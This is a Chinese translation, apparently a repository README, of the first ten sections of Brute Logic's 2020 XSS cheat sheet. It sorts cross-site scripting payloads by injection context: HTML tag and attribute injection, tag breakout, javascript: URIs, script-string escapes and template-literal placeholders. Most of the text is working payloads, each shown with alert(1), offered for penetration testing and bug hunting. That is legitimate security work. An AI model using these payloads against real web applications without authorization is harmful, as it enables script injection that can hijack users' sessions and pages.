# XSS_Cheat_Sheet_2020_Edition

## 简介
xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
该备忘清单可用于，漏洞猎人，安全分析，渗透测试人员，查找web应用的跨站点脚本漏洞 <br>
本备忘录翻译自国外的XSS_Cheat_Sheet_2020_Edition.pdf议题，源文件可在本项目内直接下载 <br>

## 摘要
**1.基本** <br>
**2.高级** <br>
**3.绕过** <br>
**4.利用** <br>
**5.额外** <br>
**6.枚举** <br>

## 内容
**1.HTML Injection （代码注入）** <br>
当输入的payload，被插入到HTML标签或外部标签的属性值内时，则使用下面的方法进行测试，如果输入的内容被插入到了HTML注释，则在payload之前添加"->"
```
<svg onload=alert(1)>
"><svg onload=alert(1)>
```
**2.HTML Injection – Tag Block Breakout（HTML注入–标签闭合）** <br>
当输入的payload，被插入到以下标签的内部时，使用以下标签：<br>
`<title> <style> <script> <textarea> <noscript> <pre> <xmp> <iframe>` （`</tag>`为相应的html标签）。
```
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
```
**3.HTML Injection - Inline （HTML注入-内联标签）** <br>
当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（>）进行闭合。<br>
```
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
```
**4.HTML Injection - Source（HTML注入-源）** <br>
当输入的payload，被作为以下HTML标签属性的值使用时：`href`，`src`，`data`或`action`。payload中的`src`属性值可以是一个URL或者`"data:,alert(1)"`。
```
javascript:alert(1)
```
**5.Javascript Injection (javascript注入)** <br>
当输入的payload，被插入到javascript标签块中的字符串定界值中时使用。
```
'-alert(1)-'
'/alert(1)//
```
**6.Javascript Injection - Escape Bypass (javascript注入-绕过)** <br>
当输入的payload，被插入到javascript标签块字符串定界值中，但具有单引号，可以尝试使用反斜杠注释进行绕过。
```
\'/alert(1)//
```
**7.Javascript Injection – Script Breakout (javascript注入-脚本突破)** <br>
当输入的payload，被插入到javascript标签块中的任何位置时使用。
```
</script><svg onload=alert(1)>
```
**8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)** <br>
当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（if，else，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。
```
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```
**9.Javascript Injection - Quoteless (javscript注入-无变量名)**

当输入的payload在同一行javascript代码中有多次反射时使用。<br>
第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。 <br>
```
/alert(1)//\
/alert(1)}//\
```
**10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)**
当输入的payload被插入到反引号```（``）```分隔的字符串内或模板引擎中时使用。
```
${alert(1)}
```

## 致谢
**英文议题作者：** <br>
@brutelogic <br>
<br>
**中文翻译团队：**<br>
@farmsec <br>
@farmsec_alice <br>
@farmsec_lancet <br>
@farmsec_answer <br>

